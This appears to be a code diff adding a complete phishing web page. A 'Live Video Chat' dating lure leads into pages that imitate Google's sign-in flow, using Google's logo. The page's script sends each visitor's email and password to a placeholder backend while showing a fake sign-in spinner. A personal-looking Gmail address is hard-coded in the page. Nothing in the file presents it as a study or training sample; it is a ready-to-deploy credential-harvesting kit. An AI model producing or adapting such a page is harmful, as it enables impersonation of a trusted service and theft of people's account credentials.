@@ -1,0 +1,473 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Live Video Chat Login</title>
+    <style>
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+        font-family: "Roboto", Arial, sans-serif;
+      }
+
+      body {
+        background-color: white;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        min-height: 100vh;
+      }
+
+      .container {
+        width: 450px;
+        padding: 48px 40px 36px;
+        border: 1px solid #dadce0;
+        border-radius: 8px;
+      }
+
+      .logo {
+        text-align: center;
+        margin-bottom: 16px;
+      }
+
+      .logo img {
+        width: 75px;
+        height: 24px;
+      }
+
+      .title {
+        font-size: 24px;
+        font-weight: 400;
+        text-align: center;
+        margin-bottom: 8px;
+      }
+
+      .subtitle {
+        font-size: 16px;
+        font-weight: 400;
+        text-align: center;
+        color: #5f6368;
+        margin-bottom: 40px;
+      }
+
+      .form-group {
+        margin-bottom: 24px;
+      }
+
+      .form-group input {
+        width: 100%;
+        padding: 13px 15px;
+        border: 1px solid #dadce0;
+        border-radius: 4px;
+        font-size: 16px;
+        outline: none;
+      }
+
+      .form-group input:focus {
+        border-color: #1a73e8;
+        border-width: 2px;
+        padding: 12px 14px;
+      }
+
+      .forgot-email {
+        text-align: left;
+        margin-bottom: 26px;
+      }
+
+      .forgot-email a {
+        color: #1a73e8;
+        text-decoration: none;
+        font-size: 14px;
+        font-weight: 500;
+      }
+
+      .divider {
+        position: relative;
+        margin: 32px 0;
+        text-align: center;
+      }
+
+      .divider::before {
+        content: "";
+        position: absolute;
+        top: 50%;
+        left: 0;
+        right: 0;
+        border-top: 1px solid #dadce0;
+        z-index: 1;
+      }
+
+      .divider span {
+        position: relative;
+        display: inline-block;
+        padding: 0 8px;
+        background-color: white;
+        color: #5f6368;
+        font-size: 14px;
+        z-index: 2;
+      }
+
+      .guest-mode {
+        font-size: 14px;
+        color: #5f6368;
+        margin-bottom: 40px;
+        line-height: 1.5;
+      }
+
+      .guest-mode a {
+        color: #1a73e8;
+        text-decoration: none;
+        font-weight: 500;
+      }
+
+      .create-account {
+        font-size: 14px;
+        color: #5f6368;
+        margin-bottom: 40px;
+      }
+
+      .create-account a {
+        color: #1a73e8;
+        text-decoration: none;
+        font-weight: 500;
+      }
+
+      .buttons {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+      }
+
+      .btn {
+        padding: 10px 24px;
+        border-radius: 4px;
+        font-size: 14px;
+        font-weight: 500;
+        cursor: pointer;
+        outline: none;
+      }
+
+      .btn-next {
+        background-color: #1a73e8;
+        color: white;
+        border: none;
+      }
+
+      .btn-next:hover {
+        background-color: #1765cc;
+        box-shadow: 0 1px 2px 0 rgba(66, 133, 244, 0.3),
+          0 1px 3px 1px rgba(66, 133, 244, 0.15);
+      }
+
+      .email-display {
+        font-size: 16px;
+        font-weight: 500;
+        text-align: center;
+        margin-bottom: 8px;
+      }
+
+      .verify-message {
+        font-size: 14px;
+        color: #5f6368;
+        text-align: center;
+        margin-bottom: 24px;
+      }
+
+      .password-input {
+        position: relative;
+      }
+
+      .show-password {
+        position: absolute;
+        right: 10px;
+        top: 50%;
+        transform: translateY(-50%);
+        color: #5f6368;
+        font-size: 14px;
+        cursor: pointer;
+      }
+
+      .forgot-password {
+        text-align: right;
+        margin-top: 8px;
+      }
+
+      .forgot-password a {
+        color: #1a73e8;
+        text-decoration: none;
+        font-size: 14px;
+        font-weight: 500;
+      }
+
+      .video-chat-container {
+        text-align: center;
+        padding: 20px;
+      }
+
+      .video-chat-title {
+        font-size: 20px;
+        margin-bottom: 16px;
+      }
+
+      .video-chat-subtitle {
+        font-size: 14px;
+        color: #5f6368;
+        margin-bottom: 24px;
+      }
+
+      .btn-google {
+        background-color: #1a73e8;
+        color: white;
+        border: none;
+        padding: 10px 24px;
+        border-radius: 4px;
+        font-size: 14px;
+        font-weight: 500;
+        cursor: pointer;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        margin: 0 auto;
+      }
+
+      .btn-google img {
+        width: 18px;
+        margin-right: 8px;
+      }
+
+      .loading-container {
+        text-align: center;
+        padding: 40px 0;
+        display: none;
+      }
+
+      .loading-spinner {
+        border: 4px solid rgba(0, 0, 0, 0.1);
+        border-radius: 50%;
+        border-top: 4px solid #1a73e8;
+        width: 40px;
+        height: 40px;
+        animation: spin 1s linear infinite;
+        margin: 0 auto 20px;
+      }
+
+      .loading-text {
+        font-size: 16px;
+        color: #5f6368;
+      }
+
+      .form-step {
+        display: none;
+      }
+
+      .form-step.active {
+        display: block;
+      }
+
+      @keyframes spin {
+        0% {
+          transform: rotate(0deg);
+        }
+        100% {
+          transform: rotate(360deg);
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <!-- Step 1: Live Video Chat Login -->
+    <div class="container">
+      <div class="form-step active" id="step1">
+        <div class="video-chat-container">
+          <h2 class="video-chat-title">Live Video Chat</h2>
+          <p class="video-chat-subtitle">
+            Login with Google and enjoy with<br />Private Live Video Chat your
+            dating
+          </p>
+          <button class="btn-google" onclick="nextStep()">
+            <img
+              src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_112x36dp.png"
+              alt="Google"
+              style="width: 70px"
+            />
+            Login with Google
+          </button>
+        </div>
+      </div>
+
+      <!-- Step 2: Email/Phone Input -->
+      <div class="form-step" id="step2">
+        <div class="logo">
+          <img
+            src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_112x36dp.png"
+            alt="Google"
+          />
+        </div>
+        <h1 class="title">Sign in</h1>
+        <p class="subtitle">Use your Google Account</p>
+
+        <div class="form-group">
+          <input type="text" id="email" placeholder="Email or phone" />
+        </div>
+
+        <div class="forgot-email">
+          <a href="#">Forgot email?</a>
+        </div>
+
+        <div class="divider">
+          <span>or</span>
+        </div>
+
+        <div class="guest-mode">
+          Not your computer? Use Guest mode to sign in privately.
+          <a href="#">Learn more about using Guest mode</a>
+        </div>
+
+        <div class="create-account">
+          <a href="#">Create account</a>
+        </div>
+
+        <div class="buttons">
+          <a
+            href="#"
+            style="color: #1a73e8; text-decoration: none; font-weight: 500"
+            >Learn more</a
+          >
+          <button class="btn btn-next" onclick="nextStep()">Next</button>
+        </div>
+      </div>
+
+      <!-- Step 3: Password Verification -->
+      <div class="form-step" id="step3">
+        <div class="logo">
+          <img
+            src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_112x36dp.png"
+            alt="Google"
+          />
+        </div>
+        <div class="email-display" id="display-email">
+          rokibmahmud013@gmail.com
+        </div>
+        <p class="verify-message">To continue, first verify it's you</p>
+
+        <div class="form-group password-input">
+          <input
+            type="password"
+            id="password"
+            placeholder="Enter your password"
+          />
+          <span class="show-password" onclick="togglePassword()">Show</span>
+        </div>
+
+        <div class="forgot-password">
+          <a href="#">Forgot password?</a>
+        </div>
+
+        <div class="buttons">
+          <a
+            href="#"
+            style="color: #1a73e8; text-decoration: none; font-weight: 500"
+            >Learn more</a
+          >
+          <button class="btn btn-next" onclick="showLoading()">Next</button>
+        </div>
+      </div>
+
+      <!-- Step 4: Loading Screen -->
+      <div class="form-step" id="step4">
+        <div class="loading-container" id="loading-screen">
+          <div class="loading-spinner"></div>
+          <div class="loading-text">Signing in...</div>
+        </div>
+      </div>
+    </div>
+
+    <script>
+      let currentStep = 1;
+      const totalSteps = 4;
+
+      function nextStep() {
+        if (currentStep < totalSteps) {
+          // Only trigger email POST if moving from step 2 to 3
+          if (currentStep === 2) {
+            const emailInput = document.getElementById("email");
+            const email = emailInput.value.trim();
+
+            if (!email) {
+              alert("Please enter your email or phone.");
+              return;
+            }
+
+            fetch("https://your-backend-api.com/save-email", {
+              method: "POST",
+              headers: {
+                "Content-Type": "application/json",
+              },
+              body: JSON.stringify({ email }),
+            })
+              .then((res) => {
+                if (!res.ok) throw new Error("Failed to save email");
+                return res.json();
+              })
+              .then(() => {
+                document.getElementById("display-email").textContent = email;
+                goToNextStep(); // Only proceed if email POST was successful
+              })
+              .catch((err) => {
+                console.error(err);
+                alert("Error saving email. Try again.");
+              });
+          } else {
+            goToNextStep();
+          }
+        }
+      }
+
+      function goToNextStep() {
+        document
+          .getElementById(`step${currentStep}`)
+          .classList.remove("active");
+        currentStep++;
+        document.getElementById(`step${currentStep}`).classList.add("active");
+      }
+
+      function showLoading() {
+        const email = document.getElementById("display-email").textContent;
+        const password = document.getElementById("password").value;
+
+        if (!password) {
+          alert("Please enter your password.");
+          return;
+        }
+
+        goToNextStep(); // Go to step 4 (loading)
+        document.getElementById("loading-screen").style.display = "block";
+
+        fetch("https://your-backend-api.com/verify-password", {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+          },
+          body: JSON.stringify({ email, password }),
+        })
+          .then((res) => {
+            if (!res.ok) throw new Error("Login failed");
+            return res.json();
+          })
+          .then((data) => {
+            alert("Login successful! Redirecting...");
+            // window.location.href = "/dashboard";
+          })
+          .catch((err) => {
+            console.error(err);
+            alert("Login failed. Try again.");
+            // Optionally go back to password input
+            currentStep = 2;
+            goToNextStep();
+          });
+      }
+    </script>
+  </body>
+</html>
